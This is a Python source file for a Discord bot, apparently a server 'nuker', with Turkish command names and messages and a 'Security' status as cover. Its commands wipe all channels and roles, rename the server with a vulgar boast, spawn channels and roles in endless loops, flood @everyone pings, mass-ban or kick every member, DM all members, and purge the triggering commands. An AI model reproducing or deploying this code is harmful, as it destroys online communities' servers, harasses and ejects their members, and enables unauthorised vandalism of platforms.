import discord
from discord.ext import commands

intents = discord.Intents.default()
intents.members = True

Bot = commands.Bot("+", intents=intents)
Stop_Russia = True
Kullanici_Adi = "z4bØ"
Token_ = open("token.txt", "r").read()
K_isim_1 = "TARAFINDAN"
K_isim_2 = "SİKİLDİNİZ"
Layer_ = "♥♥😘😍♥♥😘😍♥♥"


@Bot.event
async def on_ready():
    await Bot.change_presence(activity=discord.Game(name="Egzyy Security"))
    print("Bot is ready!")


@Bot.event
async def on_member_join(member):
    channel = discord.utils.get(member.guild.text_channels, name="gelen-giden")
    await channel.send(f"{member} aramıza katıldı!")
    print(f"{member} joined the server!")


@Bot.event
async def on_member_remove(member):
    channel = discord.utils.get(member.guild.text_channels, name="gelen-giden")
    await channel.send(f"{member} aramızdan ayrıldı!")
    print(f"@{member} leaved the server!")


@Bot.command(aliases=["yoket"])
async def yog_et(ctx):
    await ctx.channel.purge(limit=1)
    global Kullanici_Adi, Stop_Russia, K_isim_1, K_isim_2, Layer_
    with open('image.jpg', 'rb') as f:
        icon = f.read()
    try:
        await Bot.user.edit(username="z4bØ", avatar=icon)
    except:
        pass
    await Bot.change_presence(activity=discord.Game(name="z4bØ Forever!"))
    await ctx.guild.edit(name=f"{Kullanici_Adi} TARAFINDAN SİKİLDİNİZ! 😘😍 ", icon=icon)
    for c in ctx.guild.channels:
        await c.delete()
    guild = ctx.message.guild
    channels = await guild.create_text_channel("codded-by-hei")
    await channels.send("@everyone")
    while Stop_Russia:
        await guild.create_voice_channel(Layer_)
        await guild.create_voice_channel(f"{Kullanici_Adi}")
        await guild.create_voice_channel(K_isim_1)
        await guild.create_voice_channel(K_isim_2)


@Bot.command(aliases=["crash"])
async def crashing(ctx):
    await ctx.channel.purge(limit=1)
    with open('image.jpg', 'rb') as f:
        icon = f.read()
    try:
        await Bot.user.edit(username="z4bØ")
    except:
        pass
    await Bot.change_presence(activity=discord.Game(name="z4bØ Forever!"))
    global Kullanici_Adi, Stop_Russia
    await ctx.guild.edit(name=f"{Kullanici_Adi} TARAFINDAN SİKİLDİNİZ! 😘😍 ", icon=icon)
    for c in ctx.guild.channels:
        await c.delete()
    guild = ctx.message.guild
    channels = await guild.create_text_channel("codded-by-hei")
    await channels.send("@everyone")
    while Stop_Russia:
        c = await guild.create_text_channel(
            "﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽")
        await c.send("@everyone")
        c = await guild.create_text_channel(
            "𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫")
        await c.send("@everyone")


@Bot.command(aliases=["kanalsil"])
async def kanali_sill(ctx):
    await ctx.channel.purge(limit=1)
    guild = ctx.message.guild
    for c in ctx.guild.channels:
        await c.delete()
    await guild.create_text_channel("kanallar-silindi")


@Bot.command(aliases=["rolspam"])
async def role_spam(ctx):
    await ctx.channel.purge(limit=1)
    guild = ctx.guild
    for role in ctx.guild.roles:
        try:
            await role.delete()
        except:
            print(f"{role.name} silinemiyor.")
    while True:
        await guild.create_role(name=f"{Kullanici_Adi} TARAFINDAN SİKİLDİNİZ! 😘😍")


@Bot.command(aliases=["rolsil"])
async def rol_katliami(ctx):
    await ctx.channel.purge(limit=1)
    for role in ctx.guild.roles:
        try:
            await role.delete()
        except:
            print(f"{role.name} silinemiyor.")


@Bot.command(aliases=["spam"])
async def sunucu_dizla(ctx):
    await ctx.channel.purge(limit=1)
    global Kullanici_Adi, Stop_Russia
    while Stop_Russia:
        await ctx.send(f"**{Kullanici_Adi} TARAFINDAN SİKİLDİNİZ! 😘😍 @everyone @here **")


@Bot.command()
async def _kick(ctx, user: discord.Member):
    await ctx.channel.purge(limit=1)
    await ctx.guild.kick(user)


@Bot.command()
async def _ban(ctx, user: discord.Member):
    await ctx.channel.purge(limit=1)
    await ctx.guild.ban(user)


@Bot.command()
async def _dm(ctx, user: discord.Member, message):
    await ctx.channel.purge(limit=1)
    await user.send(message)


@Bot.command(aliases=["ban"])
async def ban_all(ctx):
    await ctx.channel.purge(limit=1)
    members = ctx.guild.members
    members.remove(ctx.me)
    for member in members:
        try:
            await ctx.guild.ban(member)
        except:
            pass


@Bot.command(aliases=["kick"])
async def kick_all(ctx):
    await ctx.channel.purge(limit=1)
    members = ctx.guild.members
    members.remove(ctx.me)
    for member in members:
        try:
            await ctx.guild.kick(member)
        except:
            pass


@Bot.command()
async def duyur(ctx):
    await ctx.channel.purge(limit=1)
    members = ctx.guild.members
    members.remove(ctx.me)
    for member in members:
        try:
            await member.send(f"{Kullanici_Adi} TARAFINDAN SİKİLDİNİZ! 😘😍")
        except:
            pass


@Bot.command(aliases=["ever"])
async def clr_bro(ctx):
    await ctx.send("@everyone @here")
    await ctx.channel.purge(limit=2)


@Bot.command(aliases=["clear"])
async def clear_temizlik(ctx, amount=1000):
    await ctx.channel.purge(limit=amount)


Bot.run(Token_)
